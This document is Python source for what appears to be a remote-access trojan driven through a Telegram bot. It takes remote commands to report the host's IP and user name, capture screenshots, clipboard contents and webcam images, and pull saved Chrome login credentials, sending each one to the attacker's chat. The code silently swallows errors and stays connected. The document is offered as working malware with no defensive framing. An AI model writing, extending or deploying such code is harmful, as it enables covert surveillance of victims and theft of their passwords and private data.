"""
@Author: Lars Villavicencio (sssral)
"""
from telepot import Bot, glance
from time import sleep
from datetime import datetime
from os import getpid, kill
from signal import CTRL_C_EVENT
from sys import exit

from agent import acquire, browser, connected_message, parse_commands, image_caption
from utils.config import TELEGRAM_TOKEN, CHAT_ID

bot = Bot(TELEGRAM_TOKEN)
chat_id = CHAT_ID

def handle_commands(cmd):
    content_type, chat_type, chat_id = glance(cmd)
    if content_type == 'text':
        received_command = cmd['text']
    
        typed_command, argument_command = parse_commands(received_command)

        if typed_command == 'getip':
            publicip = acquire.get_ip()
            send_message(publicip)
        elif typed_command == 'whoami':
            hostname = acquire.get_whoami()
            send_message(hostname)
        elif typed_command == 'screenshot':
            image = acquire.screen_shot()
            caption = image_caption('Screenshot from')
            send_photo(image, caption)
        elif typed_command == 'clipboard':
            """
            check if clipboard either media, document or text
            """
            cb_data = acquire.get_clipboard()
            if cb_data[1] == None:
                send_message(cb_data[0])
            else:
                caption = image_caption('Clipboard image from')
                send_photo(cb_data[0], caption)
        elif typed_command == 'snapshot':
            snapshot_data = acquire.capture_image()
            if snapshot_data[0] == None:
                send_message(snapshot_data[1])
            else:
                caption = image_caption('Snapshot image from')
                send_photo(snapshot_data[1], caption)
        elif typed_command == 'chrome':
            login_credentials = browser.get_login_credentials()
            send_documents(login_credentials)
        elif typed_command == 'kill':
            """
            https://discuss.python.org/t/terminateprocess-via-os-kill-on-windows/30882/4
            https://docs.python.org/3/library/signal.html
            https://github.com/nickoala/telepot/issues/259
            """
            try:
                send_message(f'[-] Agent stopped at {datetime.now().strftime("%m/%d/%Y %H:%M:%S")}')
                sleep(1)
                kill(getpid(), CTRL_C_EVENT)
            except KeyboardInterrupt:
                pass
        else:
            send_message("[-] UNKNOWN COMMAND Issued..")
    
def send_message(msg):
    try:
        bot.sendMessage(chat_id, msg)
    except Exception:
        pass

    return

def send_photo(msg, caption):
    try:
        bot.sendPhoto(chat_id, photo=open(msg, 'rb'), caption=caption)
    except Exception:
        pass

def send_documents(document):
    try:
        with open(document, "rb") as document_mutex:
            bot.sendDocument(chat_id, document_mutex)
    except Exception:
        pass

def main():
    try:
        bot.message_loop(handle_commands)
    except KeyboardInterrupt:
        pass

    while True:
        sleep(5)


if __name__ == '__main__':
    send_message(connected_message())
    main()